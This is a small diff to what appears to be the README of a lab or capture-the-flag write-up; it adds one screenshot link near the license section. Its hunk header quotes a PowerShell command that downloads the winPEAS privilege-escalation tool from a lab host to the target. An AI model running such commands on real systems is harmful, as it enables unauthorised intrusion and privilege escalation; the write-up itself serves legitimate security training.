@@ -200,6 +200,9 @@ Invoke-WebRequest -Uri 10.10.14.20:8000/winPEASx64.exe -OutFile winpeas.exe
 ![image](https://user-images.githubusercontent.com/19478700/173314965-14ff10cc-c549-4570-9114-24cdf709562f.png)
 ![image](https://user-images.githubusercontent.com/19478700/173315089-57029e2f-f9dc-4e1f-8849-d6f241d79822.png)
 
+![image](https://user-images.githubusercontent.com/19478700/173319106-86d50ee4-c091-474b-b2d8-5f94ed0e127d.png)
+
+
 
 <!-- LICENSE -->
 ## License
